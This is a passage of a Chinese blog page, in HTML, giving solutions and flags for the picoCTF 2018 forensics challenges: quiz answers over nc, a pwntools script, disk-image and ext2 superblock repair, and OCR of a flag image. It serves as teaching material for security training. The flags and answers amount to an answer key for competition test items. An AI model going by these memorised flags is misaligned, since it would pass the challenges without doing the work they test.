@@ -1,0 +1,1285 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next gemini" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="题目：  https://2018game.picoctf.com/problems 备用：https://findneo.github.io/p/picoCTF-2018-Problems.html  附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf   ForensicsForensics Warmup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="picoCTF-2018 解题报告">
+<meta property="og:url" content="https://findneo.github.io/180929-picoctf/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="题目：  https://2018game.picoctf.com/problems 备用：https://findneo.github.io/p/picoCTF-2018-Problems.html  附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf   ForensicsForensics Warmup">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1539266772853.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1538361495312.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1538323453203.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1538239287549.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1541167493772.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1541122722339.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1541122685539.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1538371756947.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1538368152075.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1539439034675.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1539139814957.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1539139848050.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1538828295272.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1541294444617.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1541076904847.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1538925911862.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1538929635797.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1538934008777.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1538938179361.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1538938605546.png">
+<meta property="og:image" content="https://findneo.github.io/180929-picoctf/1541310455800.png">
+<meta property="og:updated_time" content="2019-01-25T23:21:37.114Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="picoCTF-2018 解题报告">
+<meta name="twitter:description" content="题目：  https://2018game.picoctf.com/problems 备用：https://findneo.github.io/p/picoCTF-2018-Problems.html  附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf   ForensicsForensics Warmup">
+<meta name="twitter:image" content="https://findneo.github.io/180929-picoctf/1539266772853.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://findneo.github.io/180929-picoctf/">
+
+
+
+
+
+  <title>picoCTF-2018 解题报告 | 闲言语</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">闲言语</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/180929-picoctf/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">picoCTF-2018 解题报告</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-11T22:07:27+08:00">
+                2018-10-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="1539266772853.png" alt="1539266772853"></p>
+<p>题目：</p>
+<ul>
+<li><a href="https://2018game.picoctf.com/problems" target="_blank" rel="noopener">https://2018game.picoctf.com/problems</a></li>
+<li>备用：<a href="https://findneo.github.io/p/picoCTF-2018-Problems.html">https://findneo.github.io/p/picoCTF-2018-Problems.html</a> </li>
+<li>附件：<a href="https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf" target="_blank" rel="noopener">https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf</a> </li>
+</ul>
+<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Forensics-Warmup-1"><a href="#Forensics-Warmup-1" class="headerlink" title="Forensics Warmup 1"></a>Forensics Warmup 1</h2><p><code>picoCTF{welcome_to_forensics}</code> </p>
+<h2 id="Forensics-Warmup-2"><a href="#Forensics-Warmup-2" class="headerlink" title="Forensics Warmup 2"></a>Forensics Warmup 2</h2><p><code>picoCTF{extensions_are_a_lie}</code> </p>
+<h2 id="Desrouleaux"><a href="#Desrouleaux" class="headerlink" title="Desrouleaux"></a>Desrouleaux</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">nc 2018shell2.picoctf.com 63299</span><br><span class="line">You<span class="string">'ll need to consult the file `incidents.json` to answer the following questions.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">What is the most common source IP address? If there is more than one IP address that is the most common, you may give any of the most common ones.</span></span><br><span class="line"><span class="string">250.226.237.236</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">How many unique destination IP addresses were targeted by the source IP address 193.1.59.100?</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">What is the average number of unique destination IP addresses that were sent a file with the same hash? Your answer needs to be correct to 2 decimal places.</span></span><br><span class="line"><span class="string">1.43</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Great job. You'</span>ve earned the flag: picoCTF&#123;J4y_s0n_d3rUUUULo_23fa6fa6&#125;</span><br><span class="line"></span><br><span class="line">/*精确到小数点后两位 (1+1+2+1+3+1+1)/7=1.43</span><br><span class="line"></span><br><span class="line">import json</span><br><span class="line">j=json.load(open(<span class="string">'incidents.json'</span>))</span><br><span class="line">tickets=j[<span class="string">'tickets'</span>]</span><br><span class="line">hashes=dict()</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tickets:</span><br><span class="line">	<span class="keyword">if</span> t[<span class="string">'file_hash'</span>] not <span class="keyword">in</span> hashes.keys():</span><br><span class="line">		hashes[t[<span class="string">'file_hash'</span>]]=[t[<span class="string">'dst_ip'</span>]]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		hashes[t[<span class="string">'file_hash'</span>]].append(t[<span class="string">'dst_ip'</span>])</span><br><span class="line"><span class="built_in">print</span> hashes</span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment"># u'78d8572c143fb161': [u'90.174.224.210'], </span></span><br><span class="line"><span class="comment"># u'a275ec611d018a67': [u'94.165.167.88'], </span></span><br><span class="line"><span class="comment"># u'308f80097c708e3d': [u'90.174.224.210', u'216.243.24.241'], </span></span><br><span class="line"><span class="comment"># u'27d9b03884d73aaa': [u'94.165.167.88'], </span></span><br><span class="line"><span class="comment"># u'23420f902d5382e1': [u'94.165.167.88', u'16.139.98.188', u'46.11.226.205'], </span></span><br><span class="line"><span class="comment"># u'ea45791ce3528103': [u'127.19.170.162'], </span></span><br><span class="line"><span class="comment"># u'729b56eab8ac3252': [u'94.165.167.88']&#125;</span></span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<h2 id="Reading-Between-the-Eyes"><a href="#Reading-Between-the-Eyes" class="headerlink" title="Reading Between the Eyes"></a>Reading Between the Eyes</h2><p><img src="1538361495312.png" alt="1538361495312"></p>
+<p><code>picoCTF{r34d1ng_b37w33n_7h3_by73s}</code> </p>
+<h2 id="Recovering-From-the-Snap"><a href="#Recovering-From-the-Snap" class="headerlink" title="Recovering From the Snap"></a>Recovering From the Snap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/picoctf<span class="comment"># file animals.dd</span></span><br><span class="line">animals.dd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID <span class="string">"mkfs.fat"</span>, sectors/cluster 4, root entries 512, sectors 20480 (volumes &lt;=32 MB), Media descriptor 0xf8, sectors/FAT 20, sectors/track 32, heads 64, reserved 0x1, serial number 0x9b664dde, unlabeled, FAT (16 bit)</span><br><span class="line">root@kali:~/桌面/picoctf<span class="comment"># fdisk -lu animals.dd</span></span><br><span class="line">Disk animals.dd: 10 MiB, 10485760 bytes, 20480 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x00000000</span><br></pre></td></tr></table></figure>
+<p>参考 <a href="https://www.bleepingcomputer.com/forums/t/522890/imagedd-file-of-a-corrupted-external-hd-looking-to-mountrecover/" target="_blank" rel="noopener">这里</a> ，使用<a href="https://www.osforensics.com/tools/mount-disk-images.html" target="_blank" rel="noopener">OSFMount</a> 挂载磁盘，使用 <a href="https://www.cgsecurity.org/wiki/TestDisk_Download" target="_blank" rel="noopener">TestDisk &amp; PhotoRec 7.1-WIP, Data Recovery</a> 恢复被删除的<code>theflag.jpg</code> 。</p>
+<p><code>picoCTF{th3_5n4p_happ3n3d}</code> </p>
+<p><img src="1538323453203.png" alt="1538323453203"></p>
+<h2 id="admin-panel"><a href="#admin-panel" class="headerlink" title="admin panel"></a>admin panel</h2><p>用wireshark打开，导出HTTP对象，其中一个文件内容是<code>user=admin&amp;password=picoCTF{n0ts3cur3_df598569}</code> 。</p>
+<h2 id="hex-editor"><a href="#hex-editor" class="headerlink" title="hex editor"></a>hex editor</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings hex_editor.jpg | grep pico</span><br><span class="line">Your flag is: <span class="string">"picoCTF&#123;and_thats_how_u_edit_hex_kittos_8BcA67a2&#125;"</span></span><br></pre></td></tr></table></figure>
+<h2 id="Truly-an-Artist"><a href="#Truly-an-Artist" class="headerlink" title="Truly an Artist"></a>Truly an Artist</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings 2018.png | grep pico</span><br><span class="line">picoCTF&#123;look_in_image_9f5be995&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="now-you-don’t"><a href="#now-you-don’t" class="headerlink" title="now you don’t"></a>now you don’t</h2><p><img src="1538239287549.png" alt="1538239287549"></p>
+<p><code>picoCTF{n0w_y0u_533_m3}</code></p>
+<h2 id="Ext-Super-Magic"><a href="#Ext-Super-Magic" class="headerlink" title="Ext Super Magic"></a>Ext Super Magic</h2><p>根据提示使用debugfs查看img文件，发现幻数损坏。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># debugfs ext.img</span></span><br><span class="line">debugfs 1.44.4 (18-Aug-2018)</span><br><span class="line">debugfs: Bad magic number <span class="keyword">in</span> super-block <span class="keyword">while</span> trying to open ext.img</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>
+<p>从文档（<a href="https://wiki.osdev.org/Ext2#Superblock" target="_blank" rel="noopener">https://wiki.osdev.org/Ext2#Superblock</a>）可以看到使用ext2文件系统的第一步是寻找、提取、解析superblock。superblock总是从卷的1024字节开始，长度为1024字节。也就是说，如果一个扇区是512字节，那么superblock位于第2、3扇区。而在superblock中，ext2文件的signature（0xef53）位于第56、57两个字节，所以我们要修正文件的magic number为正确的signature，也就是修改(1024+56,1024+57)bytes即(1080,1081)bytes即(0x438,0x439)bytes的值为<code>0xef53</code> 。需注意采用小端序，低字节在低地址。</p>
+<p><img src="1541167493772.png" alt="1541167493772"></p>
+<p>根据文档修改superblock，然后可以mount到系统，发现有个flag图片。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file fix.img</span></span><br><span class="line">fix.img: Linux rev 1.0 ext2 filesystem data, UUID=a3708ef2-5ec0-4463-9a03-599c890645cd (large files)</span><br><span class="line"><span class="comment"># xxd ext.img &gt; ext.hex</span></span><br><span class="line"><span class="comment"># xxd fix.img &gt; fix.hex</span></span><br><span class="line"><span class="comment"># diff *.hex</span></span><br><span class="line">68c68</span><br><span class="line">&lt; 00000430: 34dc ad5b 0100 ffff 0000 0100 0100 0000  4..[............</span><br><span class="line">---</span><br><span class="line">&gt; 00000430: 34dc ad5b 0100 ffff 53ef 0100 0100 0000  4..[....S.......</span><br><span class="line"><span class="comment"># mkdir tmpdir &amp;&amp; mount fix.img tmpdir &amp;&amp; ll tmpdir/ | grep flag</span></span><br></pre></td></tr></table></figure>
+<p><img src="1541122722339.png" alt="1541122722339"></p>
+<p><img src="1541122685539.png" alt="1541122685539"></p>
+<p>尝试了多个命令行OCR工具，tesseract-ocr效果最好，但识别结果还需要修正。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$apt</span> install gocr</span><br><span class="line"><span class="variable">$apt</span> install cuneiform</span><br><span class="line"><span class="variable">$apt</span> install tesseract-ocr</span><br><span class="line"><span class="variable">$tesseract</span> cut_flag.jpg res &amp;&amp; cat res.txt</span><br><span class="line">Tesseract Open Source OCR Engine v4.0.0-rc4 with Leptonica</span><br><span class="line">Your flag is: <span class="string">"picoCTF &#123;FDBfbc6141e7F 4bscI90CIaE7SbI63aEf&#125; "</span></span><br></pre></td></tr></table></figure>
+<p>最后结果：<code>picoCTF{FDBfbC6141e7F4b8c90C9aE78b963aEf}</code></p>
+<h2 id="Lying-Out"><a href="#Lying-Out" class="headerlink" title="Lying Out"></a>Lying Out</h2><p>根据日常流量图判断流量可能异常的时间点。</p>
+<p><img src="1538371756947.png" alt="1538371756947"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">log=[</span><br><span class="line">    <span class="number">10900</span>,<span class="number">10800</span>,<span class="number">10850</span>,<span class="number">11000</span>,<span class="number">10800</span>,<span class="number">10750</span>,<span class="number">10800</span>,<span class="number">10850</span>,</span><br><span class="line">    <span class="number">10900</span>,<span class="number">11000</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">11000</span>,<span class="number">10900</span>,<span class="number">10700</span>,<span class="number">10850</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">10850</span>,<span class="number">11000</span>,<span class="number">11050</span>,<span class="number">10650</span>,<span class="number">10800</span>,<span class="number">10700</span>,<span class="number">11000</span>,</span><br><span class="line">    <span class="number">10900</span>,<span class="number">10950</span>,<span class="number">10950</span>,<span class="number">10800</span>,<span class="number">11000</span>,<span class="number">11100</span>,<span class="number">11900</span>,<span class="number">13400</span>,</span><br><span class="line">    <span class="number">13800</span>,<span class="number">13400</span>,<span class="number">12000</span>,<span class="number">11000</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10700</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">11000</span>,<span class="number">10900</span>,<span class="number">11050</span>,<span class="number">11800</span>,<span class="number">13100</span>,<span class="number">14600</span>,<span class="number">16100</span>,</span><br><span class="line">    <span class="number">16600</span>,<span class="number">16400</span>,<span class="number">14400</span>,<span class="number">12800</span>,<span class="number">11800</span>,<span class="number">11000</span>,<span class="number">10950</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10900</span>,<span class="number">10850</span>,<span class="number">10850</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">11000</span>,<span class="number">11000</span>,<span class="number">11000</span>,<span class="number">11400</span>,<span class="number">11900</span>,<span class="number">13000</span>,<span class="number">14000</span>,</span><br><span class="line">    <span class="number">14800</span>,<span class="number">15800</span>,<span class="number">16200</span>,<span class="number">15800</span>,<span class="number">14700</span>,<span class="number">13700</span>,<span class="number">12200</span>,<span class="number">12100</span>,</span><br><span class="line">    <span class="number">11100</span>,<span class="number">11000</span>,<span class="number">10900</span>,<span class="number">10800</span>,<span class="number">10700</span>,<span class="number">11000</span>,<span class="number">11000</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10900</span>,<span class="number">10700</span>,<span class="number">10900</span>,<span class="number">10800</span>,<span class="number">10750</span>,<span class="number">10950</span>,<span class="number">10900</span>,<span class="number">10800</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">'2018shell2.picoctf.com'</span>,<span class="number">39410</span>)</span><br><span class="line">prompt=r.recvuntil(<span class="string">'num_IPs'</span>)</span><br><span class="line">data=r.recv()</span><br><span class="line">nums=data.split()</span><br><span class="line"><span class="keyword">print</span> prompt,<span class="string">'\n'</span>,nums</span><br><span class="line">group=len(nums)/<span class="number">4</span></span><br><span class="line">res=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(group):</span><br><span class="line">	t=nums[i*<span class="number">4</span>+<span class="number">2</span>].split(<span class="string">':'</span>)</span><br><span class="line">	tt=int(t[<span class="number">0</span>])*<span class="number">4</span>+int(t[<span class="number">1</span>])/<span class="number">15</span></span><br><span class="line">	<span class="keyword">if</span> int(nums[i*<span class="number">4</span>+<span class="number">3</span>])&gt;log[tt]:</span><br><span class="line">		res.append(nums[i*<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">' '</span>.join(res))</span><br><span class="line"><span class="keyword">print</span> <span class="string">' '</span>.join(res),r.recv()</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [x] Opening connection to 2018shell2.picoctf.com on port 39410</span></span><br><span class="line"><span class="comment"># [x] Opening connection to 2018shell2.picoctf.com on port 39410: Trying 18.224.157.204</span></span><br><span class="line"><span class="comment"># [+] Opening connection to 2018shell2.picoctf.com on port 39410: Done</span></span><br><span class="line"><span class="comment"># You'll need to consult the file `traffic.png` to answer the following questions.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Which of these logs have significantly higher traffic than is usual for their time of day? You can see usual traffic on the attached plot. There may be multiple logs with higher than usual traffic, so answer all of them! Give your answer as a list of `log_ID` values separated by spaces. For example, if you want to answer that logs 2 and 7 are the ones with higher than usual traffic, type 2 7.</span></span><br><span class="line"><span class="comment">#     log_ID      time  num_IPs </span></span><br><span class="line"><span class="comment"># ['0', '0', '01:00:00', '11637', '1', '1', '01:30:00', '11640', '2', '2', '02:45:00', '11616', '3', '3', '10:45:00', '9962', '4', '4', '10:45:00', '10409', '5', '5', '11:45:00', '12732', '6', '6', '14:15:00', '10538', '7', '7', '16:15:00', '10233', '8', '8', '17:30:00', '10839', '9', '9', '20:15:00', '11936', '10', '10', '20:30:00', '9898', '11', '11', '21:45:00', '9653', '12', '12', '22:30:00', '10252', '13', '13', '23:15:00', '9619']</span></span><br><span class="line"><span class="comment"># 0 1 2 9 Correct!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Great job. You've earned the flag: picoCTF&#123;w4y_0ut_940df760&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [*] Closed connection to 2018shell2.picoctf.com port 39410</span></span><br><span class="line"><span class="comment"># [Finished in 3.6s]</span></span><br></pre></td></tr></table></figure>
+<h2 id="What’s-My-Name"><a href="#What’s-My-Name" class="headerlink" title="What’s My Name?"></a>What’s My Name?</h2><p><code>picoCTF{w4lt3r_wh1t3_ddfad6f8f4255adc73e862e3cebeee9d}</code>  </p>
+<p><img src="1538368152075.png" alt="1538368152075"></p>
+<h2 id="Malware-Shops"><a href="#Malware-Shops" class="headerlink" title="Malware Shops"></a>Malware Shops</h2><p>附件貌似有问题，爆破出第一个答案是5，第二个随手交一下flag就出来了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ nc 2018shell2.picoctf.com 57920</span><br><span class="line">You<span class="string">'ll need to consult the file `clusters.png` to answer the following questions.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">How many attackers created the malware in this dataset?</span></span><br><span class="line"><span class="string">5</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">In the following sample of files from the larger dataset, which file was made by the same attacker who made the file 87847bfc? Indicate your answer by entering that file'</span>s <span class="built_in">hash</span>.</span><br><span class="line">       <span class="built_in">hash</span>  jmp_count  add_count</span><br><span class="line">0  87847bfc       32.0       29.0</span><br><span class="line">1  7eeed4b3       34.0       34.0</span><br><span class="line">2  ad5e4ce0       21.0       64.0</span><br><span class="line">3  628e79cf       14.0       26.0</span><br><span class="line">4  b5e53809       11.0       35.0</span><br><span class="line">5  ebaf5ccd       15.0       13.0</span><br><span class="line">6  94ad3582       37.0       10.0</span><br><span class="line">7  42f1d364       23.0       68.0</span><br><span class="line">8  93827b93       11.0       38.0</span><br><span class="line">9  c08300fe       41.0       10.0</span><br><span class="line">7eeed4b3</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line"></span><br><span 